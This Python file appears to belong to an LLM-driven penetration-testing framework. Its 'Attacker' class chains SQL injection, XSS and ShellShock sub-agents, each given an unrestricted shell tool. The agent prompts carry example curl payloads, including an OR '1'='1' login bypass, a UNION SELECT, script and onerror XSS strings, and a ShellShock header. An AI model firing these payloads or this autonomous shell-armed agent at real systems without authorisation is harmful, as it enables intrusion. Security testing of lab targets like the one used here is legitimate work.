from datetime import datetime
from langchain_core.tools import tool
import requests
from pydantic import BaseModel, Field
import sublist3r
from ...state import PenTestState
from typing import List, Optional, Dict, Annotated, Sequence, TypedDict, Any, Type
from langchain.tools import Tool
from langgraph.graph import StateGraph, END, START
from .tools.attacktools import (SQL_Injection, XSS, ShellShock)
import logging
from langchain_core.messages import AIMessage, HumanMessage, SystemMessage, BaseMessage, ToolMessage
from langgraph.checkpoint.memory import InMemorySaver
from langgraph.graph.message import add_messages
from IPython.display import Image, display
from langchain_core.callbacks import BaseCallbackManager
import json
from langgraph.prebuilt import create_react_agent
from langgraph_swarm import create_handoff_tool, create_swarm
from langchain_core.runnables import Runnable
from langchain_community.tools import ShellTool
from ...agents.orchestrator.memory import PenTestState
from langchain.prompts import PromptTemplate
from langchain.agents import AgentExecutor

logger = logging.getLogger(__name__)

shell_tool = ShellTool()


class URL(BaseModel):
    url: str = Field(description="The URL to target")
    
    class Config:
        json_schema_extra = {
            "example": {
                "url": "http://example.com"
            }
        }

class AgentState(TypedDict):
    """The state of the agent."""
    messages: Annotated[Sequence[BaseMessage], add_messages]
    vulnerabilities: List[Dict]
    ip_port: str
    open_ports: List[int]

class Attacker(Runnable):
    def __init__(self, model):
        self.model = model
        self.name = "Attacker"
        self.tools = [shell_tool]
        
        # Create specialized agents for each attack phase
        self.sql_injection_agent = create_react_agent(
            model,
            [shell_tool],
            prompt="""You are a SQL injection expert. Your task is to test for SQL injection vulnerabilities.
            Use the shell tool to execute curl commands for testing.
            
            Testing Steps:
            1. Test login form with SQL injection payloads
            2. Test search functionality with UNION-based payloads
            3. Test URL parameters with error-based payloads
            4. Document all findings
            
            Example commands:
            curl -s -X POST -H 'Content-Type: application/json' -d '{"email":"' OR '1'='1","password":"test"}' {target}/rest/user/login
            curl -s -X GET '{target}/rest/products/search?q=' UNION SELECT 1,2,3--'
            
            Always proceed with testing in a controlled, ethical manner.""",
            name="SQL_Injection"
        )
        
        self.xss_agent = create_react_agent(
            model,
            [shell_tool],
            prompt="""You are an XSS expert. Your task is to test for cross-site scripting vulnerabilities.
            Use the shell tool to execute curl commands for testing.
            
            Testing Steps:
            1. Test input fields with XSS payloads
            2. Test URL parameters with script injection
            3. Test stored content with persistent XSS
            4. Document all findings
            
            Example commands:
            curl -s -X POST -H 'Content-Type: application/json' -d '{"comment":"<script>alert('XSS')</script>"}' {target}/rest/feedback
            curl -s -X GET '{target}/search?q=<img src=x onerror=alert('XSS')>'
            
            Always proceed with testing in a controlled, ethical manner.""",
            name="XSS"
        )
        
        self.shell_shock_agent = create_react_agent(
            model,
            [shell_tool],
            prompt="""You are a ShellShock expert. Your task is to test for ShellShock vulnerabilities.
            Use the shell tool to execute curl commands for testing.
            
            Testing Steps:
            1. Test CGI scripts with ShellShock payloads
            2. Test user-agent handling
            3. Test environment variables
            4. Document all findings
            
            Example commands:
            curl -s -H 'User-Agent: () { :;}; echo "ShellShock Test"' {target}/cgi-bin/test.cgi
            curl -s -H 'Cookie: () { :;}; echo "ShellShock Test"' {target}/cgi-bin/test.cgi
            
            Always proceed with testing in a controlled, ethical manner.""",
            name="ShellShock"
        )
        
        # Create the workflow graph
        self.workflow = self._create_graph()
        self.add_graph_edges(self.workflow)
        self.workflow = self.workflow.compile()

    @property
    def input_schema(self) -> Type[PenTestState]:
        """Return the input schema type."""
        return PenTestState

    @property
    def output_schema(self) -> Type[PenTestState]:
        """Return the output schema type."""
        return PenTestState

    def _sql_injection_phase(self, state: PenTestState):
        new_messages = []
        new_successful_exploits = []
        input_message = {
            "role": "user",
            "content": f"Test {state.ip_port} for SQL injection vulnerabilities"
        }
        for step in self.sql_injection_agent.stream(
            {"messages": [input_message]},
            stream_mode="values",
        ):
            msg = step["messages"][-1]
            new_messages.append(msg)
            new_successful_exploits.append({
                "type": "SQL Injection",
                "target": state.ip_port,
                "result": msg.content,
                "timestamp": datetime.now().isoformat()
            })
        return {
            "messages": state.messages + new_messages,
            "successful_exploits": state.successful_exploits + new_successful_exploits,
        }

    def _xss_phase(self, state: PenTestState):
        new_messages = []
        new_successful_exploits = []
        input_message = {
            "role": "user",
            "content": f"Test {state.ip_port} for XSS vulnerabilities"
        }
        for step in self.xss_agent.stream(
            {"messages": [input_message]},
            stream_mode="values",
        ):
            msg = step["messages"][-1]
            new_messages.append(msg)
            new_successful_exploits.append({
                "type": "XSS",
                "target": state.ip_port,
                "result": msg.content,
                "timestamp": datetime.now().isoformat()
            })
        return {
            "messages": state.messages + new_messages,
            "successful_exploits": state.successful_exploits + new_successful_exploits,
        }

    def _shell_shock_phase(self, state: PenTestState):
        new_messages = []
        new_successful_exploits = []
        input_message = {
            "role": "user",
            "content": f"Test {state.ip_port} for ShellShock vulnerabilities"
        }
        for step in self.shell_shock_agent.stream(
            {"messages": [input_message]},
            stream_mode="values",
        ):
            msg = step["messages"][-1]
            new_messages.append(msg)
            new_successful_exploits.append({
                "type": "ShellShock",
                "target": state.ip_port,
                "result": msg.content,
                "timestamp": datetime.now().isoformat()
            })
        return {
            "messages": state.messages + new_messages,
            "successful_exploits": state.successful_exploits + new_successful_exploits,
        }

    def _create_graph(self) -> StateGraph:
        """Create the attack workflow graph."""
        graph = StateGraph(PenTestState)
        graph.add_node("sql_injection_phase", self._sql_injection_phase)
        graph.add_node("xss_phase", self._xss_phase)
        graph.add_node("shell_shock_phase", self._shell_shock_phase)
        return graph

    def add_graph_edges(self, graph: StateGraph) -> None:
        """Add edges to the attack workflow graph."""
        graph.add_edge(START, "sql_injection_phase")
        graph.add_edge("sql_injection_phase", "xss_phase")
        graph.add_edge("xss_phase", "shell_shock_phase")
        graph.add_edge("shell_shock_phase", END)

    def get_agent(self) -> Runnable:
        """Get the agent runnable for use in the workflow."""
        return self.workflow

    def display_graph(self):
        """Display the autonomous workflow graph."""
        graph_path = 'attack_workflow.png'
        self.workflow.get_graph().draw_png(graph_path)
        print(f"Graph visualization saved to: {graph_path}")
        return display(Image(graph_path))

    def invoke(self, state: PenTestState, config: Optional[Runnable] = None, **kwargs) -> PenTestState:
        """Synchronously invoke the attacker agent."""
        try:
            if not hasattr(state, 'messages'):
                state.messages = []
            state = self.workflow.invoke(state)
            return state
        except Exception as e:
            error_message = f"Error in attack phase: {str(e)}"
            state.messages.append(AIMessage(content=error_message))
            return state

    async def ainvoke(self, state: PenTestState, config: Optional[Runnable] = None, **kwargs) -> PenTestState:
        """Asynchronously invoke the attacker agent."""
        try:
            if not hasattr(state, 'messages'):
                state.messages = []
            state = await self.workflow.ainvoke(state)
            return state
        except Exception as e:
            error_message = f"Error in attack phase: {str(e)}"
            state.messages.append(AIMessage(content=error_message))
            return state

# Local testing
if __name__ == "__main__":
    from langchain_ollama import ChatOllama
    
    # Initialize with Ollama model
    model = ChatOllama(model="llama2", temperature=1)
    attacker = Attacker(model)
    
    # Create a test state
    test_state = PenTestState(
        ip_port="http://localhost:3000/#/",
        open_ports=[80, 443],
        input_message="Start attack phase",
        remaining_steps=5,
        planning_results={},
        vulnerabilities=[],
        services=[],
        subdomains=[],
        successful_exploits=[],
        failed_exploits=[],
        risk_score=0.0,
        messages=[]
    )
    
    # Run attack phase (in async context)
    import asyncio
    result = asyncio.run(attacker.ainvoke(test_state))
    print("Attack Results:", result.vulnerabilities) 